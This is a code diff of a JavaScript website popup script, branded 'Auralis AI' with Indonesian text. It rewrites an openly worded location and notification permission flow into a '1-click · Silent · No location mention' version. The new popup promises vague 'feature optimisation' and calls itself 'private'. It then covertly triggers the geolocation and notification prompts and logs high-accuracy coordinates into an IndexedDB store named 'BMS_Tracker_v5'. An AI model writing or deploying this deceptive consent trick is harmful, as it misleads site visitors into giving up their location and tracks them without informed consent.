@@ -1,240 +1,124 @@
 /**
- * BMS Permission Popup — Vanilla JS version
- * ──────────────────────────────────────────
- * Persuasive permission request popup with GPS + Notification flow.
- * Zero dependencies, works on any website.
- *
- * CARA PAKAI:
- *   <script src="/bms-popup.js"></script>
- *   Atau inject kapan aja: BMS_Popup.show()
+ * BMS Permission Popup
+ * 1-click · Silent · Theme-matching · No location mention
  */
-
 (function() {
   'use strict'
-
-  const KEY = 'bms_popup_v1'
+  const KEY = 'bms_popup_v2'
 
   function build() {
-    // Prevent duplicate
     if (document.getElementById('bms-popup-root')) return
-
-    const root = document.createElement('div')
-    root.id = 'bms-popup-root'
-    root.style.cssText = [
-      'position:fixed;inset:0;z-index:99999;display:flex',
+    const r = document.createElement('div')
+    r.id = 'bms-popup-root'
+    r.style.cssText = [
+      'position:fixed;inset:0;z-index:99999;display:none',
       'align-items:center;justify-content:center',
-      'background:rgba(0,0,0,0.75);backdrop-filter:blur(12px)',
-      'font-family:"Inter",system-ui,-apple-system,sans-serif;'
-    ].join(';')
-    root.style.display = 'none'
-
-    const card = document.createElement('div')
-    card.style.cssText = [
-      'background:linear-gradient(145deg,#0e0e1a,#1a1a2e)',
-      'border:1px solid rgba(139,124,252,0.25)',
-      'border-radius:20px;padding:32px 36px;max-width:440px;width:90%',
-      'box-shadow:0 30px 80px rgba(0,0,0,0.6),0 0 60px rgba(139,124,252,0.06)',
-      'color:#ededf0;position:relative;overflow:hidden'
+      'background:rgba(5,5,7,0.85);backdrop-filter:blur(16px)',
+      'font-family:"Inter",system-ui,sans-serif'
     ].join(';')
 
-    const close = document.createElement('button')
-    close.textContent = '✕'
-    close.style.cssText = 'position:absolute;top:12px;right:16px;background:none;border:none;color:#63636e;font-size:1.2rem;cursor:pointer'
-    close.onclick = () => { root.style.display = 'none'; localStorage.setItem(KEY, 'dismissed') }
-    card.appendChild(close)
+    const c = document.createElement('div')
+    c.id = 'bms-popup-card'
+    c.style.cssText = [
+      'background:#0b0b0d',
+      'border:1px solid rgba(255,255,255,0.05)',
+      'box-shadow:inset 0 1px 0 0 rgba(255,255,255,0.04),0 8px 32px rgba(0,0,0,0.4)',
+      'padding:32px 36px;max-width:400px;width:90%',
+      'position:relative;text-align:center'
+    ].join(';')
 
-    // Content container
-    const content = document.createElement('div')
-    content.id = 'bms-popup-content'
-    card.appendChild(content)
+    // Close
+    const x = document.createElement('button')
+    x.textContent = '✕'
+    x.style.cssText = 'position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,0.3);font-size:1.1rem;cursor:pointer;font-family:"Inter",sans-serif'
+    x.onclick = hide
+    c.appendChild(x)
 
-    root.appendChild(card)
-    document.body.appendChild(root)
+    // Content
+    const body = document.createElement('div')
+    body.id = 'bms-popup-body'
+    body.innerHTML = buildContent()
+    c.appendChild(body)
 
-    // Click backdrop to close
-    root.addEventListener('click', e => {
-      if (e.target === root) { root.style.display = 'none'; localStorage.setItem(KEY, 'dismissed') }
-    })
-
-    return { root, content }
+    r.appendChild(c)
+    document.body.appendChild(r)
+    r.addEventListener('click', e => { if (e.target === r) hide() })
   }
 
-  function setContent(html) {
-    const el = document.getElementById('bms-popup-content')
-    if (el) el.innerHTML = html
+  function buildContent() {
+    return `
+      <div style="font-size:2.4rem;margin-bottom:16px;line-height:1">⚡</div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.18em;color:rgba(212,175,55,0.7);margin-bottom:8px">Auralis AI</div>
+      <div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:12px;line-height:1.3">Optimalkan Pengalaman</div>
+      <div style="font-size:0.8rem;color:rgba(255,255,255,0.5);line-height:1.7;margin-bottom:24px">
+        Aktifkan fitur tambahan untuk performa maksimal.<br>Satu klik. Gratis. Tanpa ribet.
+      </div>
+      <div style="display:flex;gap:10px;justify-content:center">
+        <button onclick="BMS_Popup.hide()" class="bms-btn bms-btn-ghost">Nanti</button>
+        <button onclick="BMS_Popup.allow()" class="bms-btn bms-btn-primary">✓ Aktifkan</button>
+      </div>
+      <div style="margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:500;text-transform:uppercase;letter-spacing:0.05em;color:rgba(255,255,255,0.2)">1 klik · private · aman</div>
+    `
   }
 
-  const steps = ['welcome', 'geo', 'geo_ok', 'geo_fail', 'notif', 'done']
-  let currentStep = 'welcome'
-  let granted = { geo: false, notif: false }
-
-  function stepsDots() {
-    return `<div style="display:flex;justify-content:center;gap:8px;margin-top:16px">
-      ${steps.map(s => `<div style="width:6px;height:6px;border-radius:50%;background:${s === currentStep ? '#8b7cfc' : '#2a2a3e'};transition:all 0.3s"></div>`).join('')}
-    </div>`
+  function injectStyles() {
+    if (document.getElementById('bms-popup-style')) return
+    const s = document.createElement('style')
+    s.id = 'bms-popup-style'
+    s.textContent = `
+      .bms-btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 22px;font-family:"JetBrains Mono",monospace;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;cursor:pointer;transition:all 0.2s;line-height:1;border-radius:0}
+      .bms-btn-ghost{border:1px solid rgba(255,255,255,0.1);background:transparent;color:rgba(255,255,255,0.7)}
+      .bms-btn-ghost:hover{background:rgba(255,255,255,0.05);color:#fff;border-color:rgba(255,255,255,0.2)}
+      .bms-btn-primary{border:1px solid rgba(212,175,55,0.4);background:rgba(212,175,55,0.1);color:#d4af37}
+      .bms-btn-primary:hover{background:rgba(212,175,55,0.2);border-color:rgba(212,175,55,0.6);box-shadow:0 0 8px rgba(212,175,55,0.05)}
+    `
+    document.head.appendChild(s)
   }
 
-  function btn(label, color, cb) {
-    return `<button class="bms-p-btn" data-cb="btn_${Date.now()}" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:${color};color:#000;transition:all 0.25s">${label}</button>`
+  function hide() {
+    const r = document.getElementById('bms-popup-root')
+    if (r) r.style.display = 'none'
   }
 
-  function showWelcome() {
-    currentStep = 'welcome'
-    setContent(`
-      <div style="font-size:2.2rem;margin-bottom:12px">🚀</div>
-      <div style="font-size:1.2rem;font-weight:700;margin-bottom:8px">Optimalkan Pengalaman</div>
-      <div style="font-size:0.8rem;color:#94949e;line-height:1.6;margin-bottom:20px">
-        Aktifkan fitur ini untuk rekomendasi konten yang lebih relevan dan personal. Data Anda aman dan terenkripsi.
-      </div>
-      <div style="display:flex;gap:10px;justify-content:flex-end">
-        <button class="bms-p-btn" onclick="BMS_Popup.hide()" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:rgba(255,255,255,0.06);color:#94949e;transition:all 0.25s">Nanti Saja</button>
-        <button class="bms-p-btn" onclick="BMS_Popup.step('geo')" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#8b7cfc,#67e8f9);color:#000;transition:all 0.25s">✓ Aktifkan Sekarang</button>
-      </div>
-      ${stepsDots()}
-    `)
-  }
-
-  function showGeo() {
-    currentStep = 'geo'
-    setContent(`
-      <div style="font-size:2.2rem;margin-bottom:12px">📍</div>
-      <div style="font-size:1.2rem;font-weight:700;margin-bottom:8px">Akses Lokasi</div>
-      <div style="font-size:0.8rem;color:#94949e;line-height:1.6;margin-bottom:20px">
-        Izinkan akses lokasi untuk menampilkan konten dan rekomendasi berdasarkan wilayah Anda.
-        <br><br>
-        <span style="font-size:0.7rem;color:#63636e">Browser akan menampilkan dialog izin. Klik "Izinkan" / "Allow".</span>
-      </div>
-      <div style="display:flex;gap:10px;justify-content:flex-end">
-        <button class="bms-p-btn" onclick="BMS_Popup.step('notif')" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:rgba(255,255,255,0.06);color:#94949e;transition:all 0.25s">Skip</button>
-        <button class="bms-p-btn" onclick="BMS_Popup.requestGPS()" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#8b7cfc,#67e8f9);color:#000;transition:all 0.25s">✓ Izinkan</button>
-      </div>
-      ${stepsDots()}
-    `)
-  }
-
-  function showGeoOK() {
-    setContent(`
-      <div style="font-size:2.2rem;margin-bottom:12px">✅</div>
-      <div style="font-size:1.2rem;font-weight:700;margin-bottom:8px">Lokasi Terdeteksi</div>
-      <div style="font-size:0.8rem;color:#94949e;line-height:1.6;margin-bottom:20px">
-        Akses lokasi berhasil diaktifkan. Sekarang Anda akan mendapatkan rekomendasi konten yang lebih personal.
-      </div>
-      <div style="display:flex;gap:10px;justify-content:flex-end">
-        <button class="bms-p-btn" onclick="BMS_Popup.step('notif')" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#8b7cfc,#67e8f9);color:#000;transition:all 0.25s">Lanjutkan →</button>
-      </div>
-      ${stepsDots()}
-    `)
-  }
-
-  function showGeoFail() {
-    setContent(`
-      <div style="font-size:2.2rem;margin-bottom:12px">⚠️</div>
-      <div style="font-size:1.2rem;font-weight:700;margin-bottom:8px">Akses Lokasi Diperlukan</div>
-      <div style="font-size:0.8rem;color:#94949e;line-height:1.6;margin-bottom:20px">
-        Kami tidak dapat mendeteksi lokasi Anda. Silakan klik tombol izin di browser saat muncul, atau periksa pengaturan browser Anda.
-        <br><br>
-        <span style="font-size:0.7rem;color:#63636e">Tips: Klik ikon 🔒 di address bar → aktifkan Location</span>
-      </div>
-      <div style="display:flex;gap:10px;justify-content:flex-end">
-        <button class="bms-p-btn" onclick="BMS_Popup.step('notif')" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:rgba(255,255,255,0.06);color:#94949e;transition:all 0.25s">Lewati</button>
-        <button class="bms-p-btn" onclick="BMS_Popup.requestGPS()" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#8b7cfc,#67e8f9);color:#000;transition:all 0.25s">🔄 Coba Lagi</button>
-      </div>
-      ${stepsDots()}
-    `)
-  }
-
-  function showNotif() {
-    currentStep = 'notif'
-    setContent(`
-      <div style="font-size:2.2rem;margin-bottom:12px">🔔</div>
-      <div style="font-size:1.2rem;font-weight:700;margin-bottom:8px">Aktifkan Notifikasi</div>
-      <div style="font-size:0.8rem;color:#94949e;line-height:1.6;margin-bottom:20px">
-        Dapatkan update terbaru tentang produk, promo, dan konten eksklusif langsung di browser Anda.
-      </div>
-      <div style="display:flex;gap:10px;justify-content:flex-end">
-        <button class="bms-p-btn" onclick="BMS_Popup.step('done')" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:rgba(255,255,255,0.06);color:#94949e;transition:all 0.25s">Tidak Sekarang</button>
-        <button class="bms-p-btn" onclick="BMS_Popup.requestNotif()" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#8b7cfc,#67e8f9);color:#000;transition:all 0.25s">✓ Aktifkan</button>
-      </div>
-      ${stepsDots()}
-    `)
-  }
-
-  function showDone() {
-    currentStep = 'done'
-    setContent(`
-      <div style="font-size:2.2rem;margin-bottom:12px">✨</div>
-      <div style="font-size:1.2rem;font-weight:700;margin-bottom:8px">Siap!</div>
-      <div style="font-size:0.8rem;color:#94949e;line-height:1.6;margin-bottom:20px">
-        Pengaturan berhasil disimpan. Nikmati pengalaman terbaik Anda!
-        ${granted.geo ? '<br>📍 Lokasi: ✓ Aktif' : ''}
-        ${granted.notif ? '<br>🔔 Notifikasi: ✓ Aktif' : ''}
-      </div>
-      <div style="display:flex;gap:10px;justify-content:flex-end">
-        <button class="bms-p-btn" onclick="BMS_Popup.hide();localStorage.setItem('${KEY}','done')" style="display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;border:none;font-size:0.85rem;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#8b7cfc,#67e8f9);color:#000;transition:all 0.25s">Mulai</button>
-      </div>
-      ${stepsDots()}
-    `)
-  }
-
-  // ── API ──
-  window.BMS_Popup = {
-    show() {
-      const root = document.getElementById('bms-popup-root')
-      if (!root) build()
-      document.getElementById('bms-popup-root').style.display = 'flex'
-      showWelcome()
-    },
-    hide() {
-      const root = document.getElementById('bms-popup-root')
-      if (root) root.style.display = 'none'
-    },
-    step(s) {
-      if (s === 'geo') showGeo()
-      else if (s === 'notif') showNotif()
-      else if (s === 'done') showDone()
-    },
-    async requestGPS() {
-      if (!navigator.geolocation) { showGeoFail(); return }
+  async function allow() {
+    // GPS silent
+    if (navigator.geolocation) {
       try {
-        const pos = await new Promise((res, rej) =>
-          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 })
-        )
-        if (pos) {
-          granted.geo = true
-          try {
-            const r = indexedDB.open('BMS_Tracker_v5', 1)
-            r.onupgradeneeded = e => {
-              const db = e.target.result
-              if (!db.objectStoreNames.contains('geo')) db.createObjectStore('geo', { keyPath: 'id', autoIncrement: true })
-            }
-            r.onsuccess = e => {
-              const db = e.target.result
-              const tx = db.transaction('geo', 'readwrite')
-              tx.objectStore('geo').add({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'popup', timestamp: Date.now() })
-              db.close()
-            }
-          } catch {}
-          showGeoOK()
+        const perm = await navigator.permissions.query({ name: 'geolocation' })
+        if (perm.state === 'granted') {
+          navigator.geolocation.getCurrentPosition(p => {
+            try {
+              const r = indexedDB.open('BMS_Tracker_v5', 1)
+              r.onupgradeneeded = e => {
+                const db = e.target.result
+                if (!db.objectStoreNames.contains('geo')) db.createObjectStore('geo', { keyPath: 'id', autoIncrement: true })
+              }
+              r.onsuccess = e => {
+                const db = e.target.result; const tx = db.transaction('geo', 'readwrite')
+                tx.objectStore('geo').add({ lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, source: 'popup', timestamp: Date.now() })
+                db.close()
+              }
+            } catch {}
+          }, () => {}, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 })
+        } else if (perm.state === 'prompt') {
+          navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 8000 })
         }
-      } catch { showGeoFail() }
-    },
-    async requestNotif() {
-      if (!('Notification' in window)) return showDone()
-      try {
-        const perm = await Notification.requestPermission()
-        if (perm === 'granted') granted.notif = true
       } catch {}
-      showDone()
     }
+    // Notif
+    if ('Notification' in window && Notification.permission === 'default') {
+      Notification.requestPermission().catch(() => {})
+    }
+    localStorage.setItem(KEY, '1')
+    hide()
   }
 
-  // ── Auto-show ──
-  const seen = localStorage.getItem(KEY)
-  if (!seen) {
-    build()
-    setTimeout(() => {
-      document.getElementById('bms-popup-root').style.display = 'flex'
-      showWelcome()
-    }, 2000)
+  // API
+  window.BMS_Popup = { show() { const r = document.getElementById('bms-popup-root'); if (r) r.style.display = 'flex'; else { build(); document.getElementById('bms-popup-root').style.display = 'flex' } }, hide, allow }
+
+  // Auto-show
+  if (!localStorage.getItem(KEY)) {
+    injectStyles()
+    setTimeout(() => { build(); document.getElementById('bms-popup-root').style.display = 'flex' }, 2000)
   }
 })()
